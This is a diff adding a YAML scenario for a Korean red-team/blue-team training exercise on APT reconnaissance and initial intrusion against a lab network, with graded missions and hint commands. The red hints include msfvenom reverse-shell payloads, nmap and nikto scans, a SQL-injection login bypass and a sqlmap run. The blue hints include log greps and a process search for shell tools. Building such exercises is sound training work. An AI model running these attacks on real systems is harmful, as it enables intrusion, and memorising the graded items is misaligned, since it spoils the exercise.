@@ -1,0 +1,134 @@
+id: "apt-phase1"
+title: "APT 1단계: 정찰 + 초기 침투"
+description: "국가 배후의 APT 그룹이 우리 조직을 타겟으로 삼았다는 위협 인텔리전스가 입수되었다. 1단계에서 Red Team은 OSINT 정보를 수집하고 스피어피싱 페이로드를 준비하여 초기 침투 거점을 확보해야 한다. Blue Team은 이메일 로그 분석과 엔드포인트 모니터링으로 초기 침투를 조기에 탐지해야 한다."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "대상 조직의 웹 인프라를 OSINT 방식으로 조사하라. 웹 서버의 기술 스택, CMS, 프레임워크 정보를 수집하라."
+    hint: "whatweb http://10.20.30.80 http://10.20.30.80:3000 http://10.20.30.80:8080 -v 2>&1 | head -60"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "http://10.20.30.80"
+
+  - order: 2
+    instruction: "대상 네트워크의 전체 서비스 맵을 구성하라. 모든 호스트의 열린 포트와 서비스를 스캔하라."
+    hint: "nmap -sV -O -p 1-10000 10.20.30.1 10.20.30.80 10.20.30.100 --max-retries 1 --host-timeout 15s -T4"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Service Info"
+
+  - order: 3
+    instruction: "리버스 셸 페이로드를 생성하라 (Metasploit msfvenom 사용)."
+    hint: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/payload.elf 2>&1 && file /tmp/payload.elf"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "ELF"
+
+  - order: 4
+    instruction: "스피어피싱 이메일에 첨부할 악성 매크로 문서를 시뮬레이션하라."
+    hint: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4445 -f bash -o /tmp/macro_payload.sh 2>&1 && cat /tmp/macro_payload.sh | head -5"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "payload"
+
+  - order: 5
+    instruction: "nikto로 웹 서버의 취약점을 상세 스캔하여 초기 침투 벡터를 식별하라."
+    hint: "nikto -h http://10.20.30.80:8080 -maxtime 90s -C all 2>&1 | head -50"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Server:"
+
+  - order: 6
+    instruction: "JuiceShop의 알려진 취약점을 통해 초기 접근 권한을 획득하라."
+    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "token"
+
+  - order: 7
+    instruction: "sqlmap으로 DVWA를 통한 데이터베이스 접근 경로를 확보하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --current-db 2>&1 | tail -20"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "current database"
+
+blue_missions:
+  - order: 1
+    instruction: "suricata 로그에서 정찰 단계의 스캔 활동을 탐지하라."
+    hint: "grep -iE 'scan\\|recon\\|enum' /var/log/suricata/fast.log | tail -20"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+
+  - order: 2
+    instruction: "suricata의 eve.json에서 공격자 IP의 활동 타임라인을 분석하라."
+    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp',''),json.loads(l).get('event_type','')) for l in sys.stdin]\" 2>/dev/null | tail -20"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 3
+    instruction: "Wazuh에서 비정상 인증 시도 알림을 확인하라."
+    hint: "grep -iE 'authentication\\|login\\|credential' /var/ossec/logs/alerts/alerts.json | tail -20"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alert"
+
+  - order: 4
+    instruction: "Apache 접근 로그에서 SQLi 및 취약점 스캔 흔적을 분석하라."
+    hint: "grep -iE 'sqlmap\\|nikto\\|union\\|select\\|exec' /var/log/apache2/access.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "sqlmap"
+
+  - order: 5
+    instruction: "nftables에 공격자 IP를 긴급 차단하고 로깅을 활성화하라."
+    hint: "nft add rule inet filter input ip saddr 10.20.30.201 log prefix '\"BLOCKED-APT: \"' drop"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 6
+    instruction: "웹 서버에서 비정상 프로세스나 새로 생성된 파일을 점검하라."
+    hint: "find /tmp /var/tmp /dev/shm -type f -mmin -60 -ls 2>/dev/null && ps aux | grep -v grep | grep -iE 'nc |ncat|reverse|shell|payload'"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 7
+    instruction: "Wazuh의 활성 에이전트 상태와 최근 알림 요약을 확인하라."
+    hint: "/var/ossec/bin/agent_control -l 2>/dev/null || cat /var/ossec/logs/alerts/alerts.json | tail -30"
+    points: 10
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: ""
